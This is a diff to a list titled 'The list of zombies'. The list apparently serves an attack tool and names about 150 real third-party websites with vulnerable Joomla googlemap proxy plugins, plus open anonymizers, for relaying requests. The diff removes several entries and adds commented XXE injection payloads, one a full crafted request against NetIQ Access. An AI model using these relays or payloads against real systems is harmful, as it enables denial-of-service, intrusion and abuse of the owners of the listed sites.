@@ -1,3 +1,4 @@
+# The list of zombies
 http://regex.info/exif.cgi?url=
 http://anonymouse.org/cgi-bin/anon-www.cgi/
 http://www.google.com/translate?u=
@@ -83,20 +84,15 @@ http://www.astecdisseny.com/plugins/content/plugin_googlemap2_proxy.php?url=
 http://www.fillmorefairways.com/plugins/content/plugin_googlemap2_proxy.php?url=
 http://www.bus-reichert.eu/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=
 http://www.maxxxi.ru/plugins/system/plugin_googlemap2_proxy.php?url=
-http://potholepeople.co.nz/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=
 http://www.hammondgolf.com/plugins/system/plugin_googlemap2_proxy.php?url=
-http://www.footgoal33.com/plugins/content/plugin_googlemap2_proxy.php?url=
 http://bbtoma.com/plugins/content/plugin_googlemap2_proxy.php?url=
 http://www.tajmahalrestaurant.co.za/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=
 http://www.yerbabuenacuisine.com/plugins/system/plugin_googlemap2_proxy.php?url=
 http://www.rinner-alm.com/plugins/system/plugin_googlemap2_proxy.php?url=
 http://stockbridgetownhall.co.uk/plugins/content/plugin_googlemap2_proxy.php?url=
 http://mentzerrepairs.com/plugins/system/plugin_googlemap2_proxy.php?url=
-http://www.tilmouthwell.com/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=
-http://www.homevisionsinc.com/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=
 http://toddlers.nalanda.edu.in/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=
 http://cultura-city.rv.ua/plugins/system/plugin_googlemap3_proxy.php?url=
-http://secret.leylines.info/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=
 http://bike-electric.co.uk/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=
 http://www.centroaquaria.com/plugins/content/plugin_googlemap2_proxy.php?url=
 http://agenzia-anna.com/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=
@@ -158,3 +154,7 @@ http://bao-sushi.com/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.ph
 http://www.limitless-coiffure.com/plugins/system/plugin_googlemap2_proxy.php?url=
 http://finnrelax.hu/fitnesz/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=
 http://hotelsixty3.com/plugins/system/plugin_googlemap2_proxy.php?url=
+# XXE Injection via POST:
+# http://site/script;XML;XML.txt
+# XXE Injection in NetIQ Access:
+# https://site:8443/nps/servlet/webacc?taskId=fw.PreviewObjectFilter&nextState=initialState&merge=fw.TCPreviewFilter&query=<!DOCTYPE+x+[%0a<!ENTITY+xxe+SYSTEM+"http://site">%0a]><query><container>%26xxe%3b</container><subclasses>false</subclasses></query>
